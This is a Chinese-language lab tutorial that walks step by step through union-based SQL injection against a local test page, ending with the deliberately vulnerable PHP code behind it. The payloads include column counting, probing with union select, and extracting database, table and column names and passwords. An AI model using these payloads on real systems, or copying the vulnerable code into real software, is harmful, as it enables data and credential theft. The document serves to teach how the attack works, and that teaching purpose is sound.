union注入攻击的原理及操作

靶机网址 http://192.168.95.130/sqltest/4.1.6/union.php?id=1

访问该网址，页面返回正常

在url后添加一个单引号，再次访问 页面返回的结果与id=1的不同

访问id=1 and 1=1，由于and1=1为真，所以页面返回与id=1相同的结果

访问id=1 ane 1=2，由于and1=2为假，所以页面返回与id=1不同的结果

可以得出该网站可能存在SQL注入漏洞的结论.

接着使用 order by1-99 语句查询该数据表的字段数量。可以理解为order by =1 order by =2 order by =3 …… order by =99如访问id=1 order by 5，页面返回与id=1相同的内容

访问id=1 order by 6，页面返回与id=1不同的内容

代表该表单只有5个字段内容，可以上数据库里对比一下。

在数据库查询参数ID对应的内容，然后将数据库的内容输出到页面。由于是将数据输出到页面上，所以可以使用union注入。起通过ordey by 查询的结果，得到字段数为5，所以Union注入的语句如下所示

Union select 1,2,3,4,5


可以看到页面执行成功，但是没有返回union select的结果，这是由于代码只返回第一条结果，所以union select获取的内容没有输出到页面。可以通过设置ID参数值，让服务器返回union select的结果，例如ID的值设置为-1 这样数据库中没有id=-1的数据，所以会返回union select的结果。

返回结果为2:3 意味着在union select 1,2,3,4,5中，2和3的位置可以输入MySQL语句。我们尝试在2的位置查询当前数据库名（使用database()函数）访问id=-1 union select 1,database(),3,4,5页面成功返回了当前数据库信息。

得知了数据库名后，输入以下命令来查询表名

select table_name from information_schema.tables where table_schema='test' limit 0,1


页面返回了数据库的第一个表名，如果需要查看第二个表名，则修改limit中的第一位数字，例如limit 1,1 就可以获取数据库的第二个表名


已知库名和表名，查询字段名，这里用users表名做示范。

select column_name from information_schema.columns where table_schema='test' and table_name='users' limit 0,1


通过修改limit中的第一位数据获取全部字段名




当获取了库名，表名和字段名时，就可以构造SQL语句查询数据库的数据，例如

select password from test.user limit 0,1


对比一下，可以看到和数据库里的值相同

Union注入代码分析

在Union注入页面中，程序获取GET参数ID，将ID拼接到SQL语句中，在数据库中查询参数ID对应的内容，然后将第一条查询结果中的username和address输出到页面，由于是将数据输出到页面上，所以可以利用union语句查询其他数据

<?php
$con=mysqli_connect("localhost","root","root","test");
// 检测连接
if (mysqli_connect_errno())
{
    echo "连接失败: " . mysqli_connect_error();
}
$id = $_GET['id'];
$result = mysqli_query($con,"select * from users where `id`=".$id);
$row = mysqli_fetch_array($result);
echo $row['username'] . " : " . $row['address'];
echo "<br>";
?>

当访问id=-1 union select 1,2,3,4,5 时执行的SQL语句为；

select * from users where ‘id’ =-1 union select 1,2,3,4,5

此时SQL语句可以分为select * from users where ‘id’ =-1和union select 1,2,3,4,5两条，利用第二条语句（Union查询）就可以获取数据库中的数据
